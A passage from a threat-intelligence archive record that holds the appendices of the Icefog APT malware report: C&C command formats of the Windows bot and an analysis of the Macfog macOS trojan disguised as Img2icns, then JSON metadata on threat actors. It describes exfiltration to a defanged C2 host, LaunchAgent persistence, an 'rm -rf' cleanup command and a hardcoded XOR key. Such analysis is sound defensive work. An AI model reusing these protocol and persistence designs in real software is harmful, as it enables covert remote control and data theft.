line. The message has the following format:\n\n[Total Message Size: DWORD]SC[COMMAND]\n\nThe bot checks if the COMMAND contains “sleep” then it sleeps for the specified time after “sleep”\n\nsubstring.\n\nOtherwise, a new cmd.exe processes is spawned to execute the COMMAND. If the command does\n\nnot contain “>” the output will be directed to %TMP%\\cmd1.dat and the result will be sent to the\n\nC&C automatically using the following format:\n\n[Total Message Size: DWORD][cmd1.dat data]\n\nThe %TMP%\\cmd1.dat is deleted after the file is sent to the C&C.\n\n\n-----\n\nAPPENDIX C\n\nCOMMAND DOWNLOAD\n\nThis command is used to download a file from the victim machine. The message has the following\n\nformat:\n\n[Total Message Size: DWORD]DL[FILEPATH]\n\nThe server expects the bot to send a response message with the file size from victim bot\n\n[Total Message Size: DWORD]OK[File Size: DWORD]\n\nThen the server sends an acknowledgement message to the victim bot\n\n[Total Message Size: DWORD]OK\n\nThe bot encrypts the contents of the file and saves it to %TMP%\\mstmpdata.dat. After that part it\n\nsends mstmpdata.dat file split in chunks of 0x4ffc each (the last one may be shorter than 0x4ffc).\n\nHere is the format of that message:\n\n[Total Message Size: DWORD][File data no longer than 0x4ffc]\n\nThe last message is repeated containing the next chunk of the file until end of file is reached.\n\nCOMMAND UPLOAD\n\nThis command is used to upload a file from the C&C to the bot. The format of this command is the\n\nfollowing:\n\n[Total Message Size: DWORD]UP[File Size: DWORD][Data Chunk Size+Total\n\nMessage Size field length, a hardcoded value of 0x5000: DWORD][File\n\n**Name]**\n\nThe server expect an OK message from the bot\n\n[Total Message Size: DWORD]OK\n\nThen C&C sends the first part of the file.\n\n[Total Message Size: DWORD][File data no longer than 0x4ffc]\n\nThe server expects the OK message from the bot and transfers the next data chunk until the whole\n\nfile is uploaded\n\n\n-----\n\nAppendix C\n\nCOMMAND SLEEP\n\nThis command is used to suspend the C&C connection thread for 1 second.\n\n[Total Message Size: DWORD]SL\n\n\n-----\n\nAPPENDIX D\n\n## ►►APPENDIX D\n\n#### THE MACFOG BOT DESCRIPTION\n\nThe MacOS X malware uses the type “1” protocol, just as the Windows version of Icefog. It has been\n\ndistributed on various Internet message boards and forums as an application called “Img2icns”.\n\nThere are two known malicious bundles, one contains the launcher and the backdoor modules, and\n\nanother contains the dropper and the backdoor modules.\n\nOnce the user executes the malicious application bundle, the backdoor is copied to the user’s\n\ndirectory and the legitimate application is started as if there was no added malicious code.\n\nMACFOG — LAUNCHER MODULE\n\nFilename: launchd\n\nLocation in the bundle: Img2icns.app/Contents/MacOS/launchd\n\nFile size: 23084 bytes\n\nFormat: Mach-O Intel 64-bit executable\n\nMD5: 336de9428650c46b64ff699ab4a441bb\n\nThe module is written in Objective C language and contains 4 classes: AppDelegate, UCHostInf,\n\nUCNet, UCUpDownload. The latter three classes seem to be included from the backdoor’s source\n\ncode but not used.\n\nAll functionality is implemented in the function “AppDelegate - (void)\n\napplicationDidFinishLaunching:(id)”.\n\nThe module was created from the same source code as the dropper but instead of installing the\n\nbackdoor module, it only executes the malicious payload and the decoy application:\n\n“%bundle path%/Contents/Resources/.launchd.app”\n\n“%bundle path%/Contents/Resources/.Img2icns.app” (the original “Img2icns”\n\napplication, http://www.img2icnsapp.com/).\n\n\n-----\n\nAppendix D\n\nMACFOG — DROPPER MODULE\n\nFilename: Img2icns\n\nLocation in the bundle: Img2icns.app/Contents/MacOS/Img2icns\n\nFile size: 23236 bytes\n\nFormat: Mach-O Intel 64-bit executable\n\nMD5: 9f422bb6c00bb46fbfa3918ae3e9447a\n\nThe module is written in Objective C language and contains 4 classes: AppDelegate, UCHostInf,\n\nUCNet, UCUpDownload. The latter three classes seem to be included from the backdoor’s source\n\ncode but not used.\n\nAll functionality is implemented in the function “AppDelegate - (void)\n\napplicationDidFinishLaunching:(id)”.\n\nThe module copies its malicious bundle from “Contents/Resources/.launchd.app” to user’s home\n\ndirectory “/Users/%username%” and launches it, effectively activating the backdoor. Then, it\n\nlaunches the legitimate part of the bundle, “Contents/Resources/Img2icns.app” that is the original\n\n“Img2icns” application (http://www.img2icnsapp.com/).\n\nMACFOG — BACKDOOR MODULE\n\nFilename: launchd\n\nLocation in the bundle: Img2icns.app/Contents/Resources/.launchd.app/Contents/\nMacOS/launchd\n\nLocation on disk: /Users/%user name%/.launchd.app/Contents/MacOS/launchd\n\nFile size: 32748 bytes\n\nFormat: Mach-O Intel 64-bit executable\n\nMD5: cf1815491d41202eb8647341a8695e1e\n\nThe module is written in Objective C language and contains 5 classes: AppDelegate, UCHostInf,\n\nUCNet, UCUpDownload, KEYLogger.\n\nThe “KEYLogger” class appears to be incomplete. It is only able to get information about active\n\nmodifier keys and writes data to a log file: “$HOME/Library/log.log”\n\n\n-----\n\nAPPENDIX D\n\nWhen started, the module launches an application: “%application’s bundle path%/Contents/\n\nResources/.launchd.app” This code seems to be reused from the dropper module.\n\nThen, it proceeds with installation. Once the installation is finished, it starts its main thread\n\n(“UCServerThread” function) in an infinite loop.\n\nINSTALLATION\n\nThe module checks if its bundle directory is located in “/Users/%username%/” and if not it copies\n\nthe bundle to that directory.\n\nIt also writes the command “rm -rf %original bundle path%” to the file “/Users/%username%/.launchd.\n\napp/config.dat”. This command is then executed by the installed copy of the backdoor, effectively\n\nremoving the original bundle directory.\n\nThen, it creates a file “$HOME/Library/LaunchAgents/apple.launchd.plist” with all the parameters\n\nrequired to launch the backdoor every time the system starts.\n\nMAIN THREAD\n\nThe module retrieves host information and host name and uploads this information to the C2 server.\n\nAll data sent to the C&C server is encrypted with the hardcoded XOR key “*&~^%@0hh8979”.\n\nFirst, it makes a POST request with URL “hxxp://appst0re.net/upload.\n\naspx?filepath=ok&filename=%hostname%.jpg”. After that, it requests commands from the C&C\n\nserver. If no data was received, it tries again after sleeping for 120 seconds.\n\nThe module requests new commands by making a POST request to the C&C server by URL “hxxp://\n\nappst0re.net/upload.aspx?filepath=order&filename=%hostname%.jpg” and then executes the\n\ncommand:\n\n|command:|Col2|\n|---|---|\n|COMMAND|DESCRIPTION|\n|upload|Download the file from the C&C server and save it to disk|\n|download|Upload the file to the C&C server|\n|cmd|Execute command via “popen” function, upload results to the C&C server|\n\n\n-----\n\nAppendix D\n\nInformation retrieved from the system:\n\n>> host name\n\n>> OS name\n\n>> OS version string\n\n>> process information\n\n>> IP addresses\n\n>> system uptime\n\n>> host date/time\n\nC&C server: hxxp://appst0re.net\n\nC&C URLs: hxxp://appst0re.net/upload.aspx?filepath=%order/ok/arbitrary\n_name%&filename=%hostname%.jpg_\n\nCLASS STRUCTURE\n\nAppDelegate (main)\n\n-[AppDelegate applicationDidFinishLaunching:]\n\n-[AppDelegate UCServerThread:]\n\n-[AppDelegate window]\n\n-[AppDelegate setWindow:]\n\nUCHostInf\n\n+[UCHostInf GetHostName]\n\n+[UCHostInf GetHostInfo]\n\nUCNet\n\n+[UCNet HttpGet:PostData:Error:]\n\n+[UCNet HttpGetSimple:Error:]\n\n+[UCNet HttpPost:PostData:Error:]\n\n\n-----\n\nAPPENDIX D\n\n\n+[UCNet HttpPostSimple:Error:]\n\nUCUpDownLoad\n\n+[UCUpDownLoad UpLoadFile:FileName:FileData:]\n\n+[UCUpDownLoad DownLoadFile:FileName:]\n\nKEYLogger\n\n+[KEYLogger keyLogger]\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "6fc23d14-23a6-4870-8fad-b291b182596f",
            "created_at": "2022-10-25T16:07:18.480113Z",
            "updated_at": "2022-10-25T16:07:18.480113Z",
            "deleted_at": null,
            "name": "ETDA",
            "url": "https://apt.etda.or.th",
            "description": "Threat Group Cards: A Threat Actor Encyclopedia",
            "reports": null
        },
        {
            "id": "bf5be533-fa31-4590-ae37-5761c97ffa34",
            "created_at": "2022-10-25T16:13:58.389257Z",
            "updated_at": "2022-10-25T16:13:58.389257Z",
            "deleted_at": null,
            "name": "Malpedia",
            "url": "https://malpedia.caad.fkie.fraunhofer.de",
            "description": "Malpedia is a free service offered by Fraunhofer FKIE",
            "reports": null
        },
        {
            "id": "6825b8cb-7d82-43d2-b0b0-d51c7e255b42",
            "created_at": "2023-01-06T13:46:37.642134Z",
            "updated_at": "2023-01-06T13:46:37.642134Z",
            "deleted_at": null,
            "name": "MISPGALAXY",
            "url": "https://www.misp-project.org/galaxy.html",
            "description": "MISP Galaxy Clusters",
            "reports": null
        }
    ],
    "references": [
        "https://d2538mqrb7brka.cloudfront.net/wp-content/uploads/sites/43/2018/03/20133739/icefog.pdf"
    ],
    "report_names": [
        "icefog.pdf"
    ],
    "threat_actors": [
        {
            "id": "5d9dfc61-6138-497a-b9da-33885539f19c",
            "created_at": "2022-10-25T16:07:23.720008Z",
            "updated_at": "2025-03-27T02:02:09.944484Z",
            "deleted_at": null,
            "main_name": "Icefog",
            "aliases": [
                "ATK 23",
                "Dagger Panda",
                "Icefog",
                "Red Wendigo"
            ],
            "source_name": "ETDA:Icefog",
            "tools": [
                "8.t Dropper",
                "8.t RTF exploit builder",
                "8t_dropper",
                "Dagger Three",
                "Fucobha",
                "Icefog",
                "Javafog",
                "POISONPLUG.SHADOW",
                "RoyalRoad",
                "ShadowPad Winnti",
                "XShellGhost"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "1aead86d-0c57-4e3b-b464-a69f6de20cde",
            "created_at": "2023-01-06T13:46:38.318176Z",
            "updated_at": "2025-03-27T02:00:02.803684Z",
            "deleted_at": null,
            "main_name": "DAGGER PANDA",
            "aliases": [
                "IceFog",
                "RedFoxtrot",
                "Red Wendigo",
                "PLA Unit 69010"
            ],
            "source_name": "MISPGALAXY:DAGGER PANDA",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "aa73cd6a-868c-4ae4-a5b2-7cb2c5ad1e9d",
            "created_at": "2022-10-25T16:07:24.139848Z",
            "updated_at": "2025-03-27T02:02:10.120505Z",
            "deleted_at": null,
            "main_name": "Safe",
            "aliases": [],
            "source_name": "ETDA:Safe",
            "tools": [
                "DebugView",
                "LZ77",
                "OpenDoc",
                "SafeDisk",
                "TypeConfig",
                "UPXShell",
                "UsbDoc",
                "UsbExe"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "dabb6779-f72e-40ca-90b7-1810ef08654d",
            "created_at": "2022-10-25T15:50:23.463113Z",
            "updated_at": "2025-03-27T02:00:55.47619Z",
            "deleted_at": null,
            "main_name": "APT1",
            "aliases": [
                "APT1",
                "Comment Crew",
                "Comment Group",
                "Comment Panda"
            ],
            "source_name": "MITRE:APT1",
            "tools": [
                "Seasalt",
                "ipconfig",
                "Cachedump",
                "PsExec",
                "GLOOXMAIL",
                "Lslsass",
                "PoisonIvy",
                "WEBC2",
                "Mimikatz",
                "gsecdump",
                "Pass-The-Hash Toolkit",
                "Tasklist",
                "xCmd",
                "pwdump"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "cf7fc640-acfe-41c4-9f3d-5515d53a3ffb",
            "created_at": "2023-01-06T13:46:38.228042Z",
            "updated_at": "2025-03-27T02:00:02.775905Z",
            "deleted_at": null,
            "main_name": "APT1",
            "aliases": [
                "GIF89a",
                "G0006",
                "PLA Unit 61398",
                "Group 3",
                "TG-8223",
                "Comment Group",
                "ShadyRAT",
                "COMMENT PANDA",
                "Comment Crew",
                "Byzantine Candor",
                "Brown Fox"
            ],
            "source_name": "MISPGALAXY:APT1",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "c39b0fe6-5642-4717-9a05-9e94265e3e3a",
            "created_at": "2022-10-25T16:07:24.332084Z",
            "updated_at": "2025-03-27T02:02:10.175452Z",
            "deleted_at": null,
            "main_name": "Tonto Team",
            "aliases": [
                "Bronze Huntley",
                "CactusPete",
                "Earth Akhlut",
                "HartBeat",
                "Karma Panda",
                "LoneRanger",
                "Operation Bitter Biscuit",
                "TAG-74",
                "Tonto Team"
            ],
            "source_name": "ETDA:Tonto Team",
            "tools": [
                "8.t Dropper",
                "8.t RTF exploit builder",
                "8t_dropper",
                "Bioazih",
                "Bisonal",
                "CONIME",
                "Dexbia",
                "Korlia",
                "LOLBAS",
                "LOLBins",
                "Living off the Land",
                "Mimikatz",
                "POISONPLUG.SHADOW",
                "RoyalRoad",
                "ShadowPad Winnti",
                "XShellGhost"
            ],
            "source_id": "ETDA",
            "reports": null
        }
    ],
    "ts_created_at": 1666716501,
    "ts_updated_at": 1743041482,
    "ts_creation_date": 1380204223,
    "ts_modification_date": 1380204232,
    "files": {
        "pdf": "https://archive.orkl.eu/4738dff6abc8e5b93f947a76a63a305bd9d40e0f.pdf",
        "text": "https://archive.orkl.eu/4738dff6abc8e5b93f947a76a63a305bd9d40e0f.txt",
        "img": "https://archive.orkl.eu/4738dff6abc8e5b93f947a76a63a305bd9d40e0f.jpg"
    }
}